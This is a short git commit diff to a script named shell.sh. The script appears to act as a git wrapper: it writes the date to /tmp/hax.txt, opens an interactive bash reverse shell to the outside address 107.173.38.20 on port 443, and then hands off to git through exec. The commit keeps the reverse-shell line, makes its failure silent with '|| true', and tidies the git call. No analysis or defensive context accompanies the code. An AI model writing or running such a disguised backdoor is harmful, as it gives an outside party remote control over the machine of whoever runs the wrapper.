b3ca1558c184bfb2de771466946ad90b28fa571d
seanyeoh <sean@yeoh.dev>
2024-09-15 09:28:05 +0800

    Sun 15 Sep 2024 09:28:05 CST

--- shell.sh
+++ shell.sh
@@ -7,9 +7,6 @@ ls $(pwd)
 
 echo $(date) > /tmp/hax.txt
 
-bash -i >& /dev/tcp/107.173.38.20/443 0>&1 || echo callback not online
+bash -i >& /dev/tcp/107.173.38.20/443 0>&1 || echo callback not online || true
 
-git $@
-
-
-
+exec git $@
